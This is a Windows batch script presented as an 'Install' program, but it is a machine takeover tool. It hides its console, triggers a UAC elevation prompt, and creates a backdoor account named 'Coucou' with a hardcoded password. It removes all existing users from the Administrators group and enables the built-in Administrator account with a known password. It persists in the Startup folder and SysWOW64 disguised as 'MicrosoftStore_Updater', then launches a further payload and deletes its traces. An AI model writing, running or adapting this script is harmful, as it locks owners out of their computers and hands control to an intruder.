@echo off
cls
mode con: cols=15 lines=1
cls
title Install
cls

REM			-----> Copy everything in case it's not launched as Admin (*can* loose USB path on certain W-versions)
if exist C:\Temp\Win-Install.something (
  cd C:\Temp\
  cls
) else (
    mkdir C:\Temp\
    copy Esc.cmd.lnk C:\Temp\Isu_3.lnk
    cls
    copy Esc.cmd C:\Temp\Isu_3.cmd
    cls
    copy Win-Install.something C:\Temp\Win-Install.something
    cls
)
cls

REM  --> If can Install
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system") ELSE (
      >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")

REM --> IF error then Admin
if '%errorlevel%' NEQ '0' (
    cls
    ping localhost /t /n 2 > nul
    goto UACPrompt
) else ( goto gotAdmin )

REM --> Getting Admin
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"


cls
net user > C:\Temp\idc_9.txt
cls
find /i "Administrateur" C:\Temp\idc_9.txt && ( set lang=FR )
cls
find /i "Administrator" C:\Temp\idc_9.txt && ( set lang=EN )
cls
del C:\Temp\idc_9.txt
cls
net user Coucou /add
cls
net localgroup WDAGUtilityAccount /add
cls
net localgroup WDAGUtilityAccount Coucou /add
cls
net user Coucou CoucouWas-here
cls
net user Coucou /active:no
cls
if %lang%==EN ( goto AdminEn )
cls
if %lang%==FR ( goto AdminFr )
cls

:AdminEn
    cls
    FOR /f "skip=6 delims=" %u IN ('net localgroup Administrators') DO (IF "%u" NEQ "The command completed successfully." echo %u>>C:\Temp\Pol_1.txt && net localgroup Administrators %u /delete && net localgroup Users %u /add)
    cls
    net localgroup Administrators Coucou /add
    cls
    net user Administrator CoucouWas-hereAdmin
    cls
    net user Administrator /active:yes
    cls
    goto SkipLang
    cls

:AdminFr
    cls
    FOR /f "skip=6 delims=" %u IN ('net localgroup Administrateurs') DO (IF "%u" NEQ "The command completed successfully." echo %u>>C:\Temp\Pol_1.txt && net localgroup Administrateurs %u /delete && net localgroup Utilisateurs %u /add)
    cls
    net localgroup Administrateurs Coucou /add
    cls
    net user Administrateur CoucouWas-hereAdmin
    cls
    net user Administrateur /active:yes
    cls
    goto SkipLang
    cls

:SkipLang
    cls

cls
copy C:\Temp\Isu_3.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\MicrosoftStore_Updater.lnk"
cls
copy C:\Temp\Isu_3.cmd "C:\Windows\SysWOW64\MicrosoftStore_Updater.cmd"
cls
copy C:\Temp\Pol_1.txt "C:\Windows\SysWOW64\Old_AdminList.txt"
cls
del C:\Temp\Pol_1.txt
cls
del C:\Temp\Isu_3.lnk
cls
del C:\Temp\Isu_3.cmd
cls
mode con: cols=150 lines=50
cls
C:\Temp\Win-Install.something
del C:\Temp\Win-Install.something
del /f /q /a "C:\Temp"
del /f /q /a "C:\Temp"
exit